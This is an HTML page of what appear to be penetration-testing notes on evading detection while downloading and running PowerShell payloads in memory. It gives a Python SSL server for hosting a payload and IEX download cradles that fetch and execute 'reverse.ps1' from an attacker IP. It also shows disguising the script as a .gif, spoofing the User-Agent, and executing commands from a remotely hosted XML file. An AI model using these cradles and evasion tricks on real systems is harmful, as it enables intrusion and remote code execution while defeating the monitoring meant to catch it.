<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Evasion:  download and run file in memory</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Evasion:  download and run file in memory</h1><br/><br />• <strong>SSL Web Server</strong><br />When hosting the PowerShell script, it is better have an SSL certificate configured on the attacker machine. <br />    This helps in evading over-the-wire heuristics as our traffic will go over HTTPS.<br />   ◇ Python 2<br />    <div class="codebox"><pre>import socketserver<br />import http.server<br />import ssl<br /><br />httpd <span style="color:#ff9d00;font-weight:700">=</span> socketserver.TCPServer((<span style="color:#333333;font-weight:400">&#39;localhost&#39;</span>, <span style="color:#333333;font-weight:400">4443</span>), http.server.SimpleHTTPRequestHandler)<br /><br />httpd.socket <span style="color:#ff9d00;font-weight:700">=</span> ssl.wrap_socket (httpd.socket, keyfile<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;/home/kali/Desktop/key.pem&quot;</span>, certfile<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;/home/kali/Desktop/cert.pem&quot;</span>, server_side<span style="color:#ff9d00;font-weight:700">=</span>True)<br /><br />httpd.serve_forever()</pre></div><br />    To generate key and cert files with OpenSSL use following command<br />    <div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>$ openssl req <span style="color:#ff9d00;font-weight:700">-</span>x509 <span style="color:#ff9d00;font-weight:700">-</span>newkey rsa<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">2048</span> <span style="color:#ff9d00;font-weight:700">-</span>keyout <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>key.pem <span style="color:#ff9d00;font-weight:700">-</span>out <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>cert.pem <span style="color:#ff9d00;font-weight:700">-</span>days <span style="color:#333333;font-weight:400">365</span></pre></div><br />    Now we can download file from the target machine<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;https://192.168.147.139:4443/reverse.ps1&#39;</span>);</pre></div><br />    <span style="color:#ff0000;">WARNING</span>: if we have this error <br />    <a href=""><img src="images/1365-1.png" alt="images/1365-1.png" /></a><br />    see <a href="https://blog.ukotic.net/2017/08/15/could-not-establish-trust-relationship-for-the-ssltls-invoke-webrequest/">https://blog.ukotic.net/2017/08/15/could-not-establish-trust-relationship-for-the-ssltls-invoke-webrequest/</a><br />    <br /><br />• <strong>Give a different extension to the file</strong><br />    Another trick we can use which might help in evading basic file extension heuristics is to give our PowerShell script a different extension, for instance, “Logo.gif.” PowerShell will still execute it as a .ps1 script.<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).downloadstring(<span style="color:#333333;font-weight:400">&#39;http://192.168.147.139:4443/reverse.gif&#39;</span>);</pre></div><br /><br />• <strong>Specify a custom user-agent</strong><br />    This can help us evade detection mechanisms that are flagging on abnormal User-Agents<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$downloader</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$downloader</span>.Headers.Add(<span style="color:#3ad900;font-weight:400">&quot;user-agent&quot;</span>, <span style="color:#3ad900;font-weight:400">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&quot;</span>)<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$payload</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#3ad900;font-weight:400">&quot;http://192.168.147.139/reverse.ps1&quot;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$command</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#0088ff;font-weight:400">$downloader</span>.DownloadString(<span style="color:#0088ff;font-weight:400">$payload</span>)<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">iex</span> <span style="color:#0088ff;font-weight:400">$command</span></pre></div><br /><br />• <strong>Execute commands inside an hosted XML document</strong><br />    The document below will simply list the system processes when executed<br />    <div class="codebox"><pre>&lt;<span style="color:#ff9d00;font-weight:700">?</span><span style="color:#7f0044;font-weight:400">xml</span> version<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#3ad900;font-weight:400">&quot;1.0&quot;</span><span style="color:#ff9d00;font-weight:700">?</span>&gt;<br />&lt;command&gt;<br />    &lt;a&gt;<br />        &lt;execute&gt;<span style="color:#ff9d00;font-weight:700">Get-Process</span>&lt;<span style="color:#ff9d00;font-weight:700">/</span>execute&gt;<br />    &lt;<span style="color:#ff9d00;font-weight:700">/</span>a&gt;<br />&lt;<span style="color:#ff9d00;font-weight:700">/</span>command&gt;</pre></div><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$xmldoc</span> <span style="color:#ff9d00;font-weight:700">=</span> <span style="color:#ff9d00;font-weight:700">New-Object</span> System.<span style="color:#7f0044;font-weight:400">Xml</span>.XmlDocument<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#0088ff;font-weight:400">$xmldoc</span>.Load(<span style="color:#3ad900;font-weight:400">&quot;http://192.168.147.139/xmlDocument.xml&quot;</span>).command.a.execute<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; <span style="color:#ff9d00;font-weight:700">iex</span> <span style="color:#0088ff;font-weight:400">$xmldoc</span>.command.a.execute</pre></div><br /><br /></div>
</body>
</html>
